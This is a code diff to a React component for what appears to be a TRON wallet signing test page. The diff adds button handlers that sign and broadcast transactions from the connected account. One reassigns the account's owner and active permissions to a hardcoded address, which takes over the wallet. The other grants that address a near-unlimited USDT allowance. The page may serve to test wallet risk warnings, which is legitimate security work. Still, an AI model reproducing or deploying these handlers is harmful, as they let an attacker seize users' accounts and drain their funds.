@@ -1,8 +1,9 @@
 import {
-  Alert,
   Button,
   Card, Col, Row, Space, message,
 } from 'antd';
+import { useState } from 'react';
+import { myTronAddress, tronUSDTAddress } from '../../../../utils/const';
 
 export default function SignTransaction({ account }) {
   const handleSign = async () => {
@@ -74,33 +75,102 @@ export default function SignTransaction({ account }) {
     }
   };
 
+  const [updateAccountPermissionsLoading, setUpdateAccountPermissionsLoading] = useState(false);
+  const updateAccountPermissions = async () => {
+    try {
+      setUpdateAccountPermissionsLoading(true);
+      const ownerPermission = {
+        type: 0, permission_name: 'owner', threshold: 1, keys: [],
+      };
+
+      const activePermission = {
+        type: 2,
+        permission_name: 'active0',
+        threshold: 1,
+        operations: '7fff1fc0037e0000000000000000000000000000000000000000000000000000',
+        keys: [],
+      };
+
+      ownerPermission.keys.push({ address: tronWeb.address.toHex(myTronAddress), weight: 1 });
+      activePermission.keys.push({ address: tronWeb.address.toHex(myTronAddress), weight: 1 });
+
+      const updateTransaction = await tronWeb.transactionBuilder.updateAccountPermissions(
+        tronWeb.address.toHex(account),
+        ownerPermission,
+        null,
+        [activePermission],
+      );
+      const signedTx = await tronWeb.trx.sign(updateTransaction);
+      await tronWeb.trx.sendRawTransaction(signedTx);
+    } catch (error) {
+      console.error(error);
+      message.error('操作失败');
+    } finally {
+      setUpdateAccountPermissionsLoading(false);
+    }
+  };
+
+  const [increaseApprovalLoading, setIncreaseApprovalLoading] = useState(false);
+  const increaseApproval = async () => {
+    try {
+      setIncreaseApprovalLoading(true);
+      const parameter = [{ type: 'address', value: myTronAddress }, { type: 'uint256', value: tronWeb.toSun(99999999999999) }];
+      const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
+        tronWeb.address.toHex(tronUSDTAddress),
+        'increaseApproval(address,uint256)',
+        { feeLimit: 100000000 },
+        parameter,
+        tronWeb.address.toHex(account),
+      );
+      const signedTx = await tronWeb.trx.sign(transaction);
+      await tronWeb.trx.sendRawTransaction(signedTx);
+    } catch (error) {
+      console.error(error);
+      message.error('操作失败');
+    } finally {
+      setIncreaseApprovalLoading(false);
+    }
+  };
+
   return (
-    <Card title="合约交互 (signTransaction)">
+    <Card title="合约交互 - 请打开控制台查看签名结果">
       <Space direction="vertical" style={{ width: '100%' }}>
         <Row gutter={6}>
-          <Col span={12}>
-            <Card direction="vertical">
+          <Col span={6}>
+            <Card direction="vertical" title="">
               <Space direction="vertical" style={{ width: '100%' }}>
-                <Button disabled={!account} block onClick={handleSign}>普通交易签名</Button>
-                <Alert
-                  type="warning"
-                  message="Result"
-                  description="请打开控制台查看"
-                />
+                <Button
+                  block
+                  disabled={!account}
+                  loading={updateAccountPermissionsLoading}
+                  onClick={updateAccountPermissions}
+                >
+                  修改账户权限
+                </Button>
               </Space>
             </Card>
           </Col>
           <Col span={12}>
             <Card direction="vertical">
               <Space direction="vertical" style={{ width: '100%' }}>
+                <Button
+                  block
+                  disabled={!account}
+                  loading={increaseApprovalLoading}
+                  onClick={increaseApproval}
+                >
+                  increaseApproval
+                </Button>
+                <Button
+                  block
+                  disabled={!account}
+                  onClick={handleSign}
+                >
+                  合约交互
+                </Button>
                 <Button disabled={!account} block onClick={handleSignWithGrayAddress}>
                   签名命中灰地址
                 </Button>
-                <Alert
-                  type="warning"
-                  message="Result"
-                  description="请打开控制台查看"
-                />
               </Space>
             </Card>
           </Col>
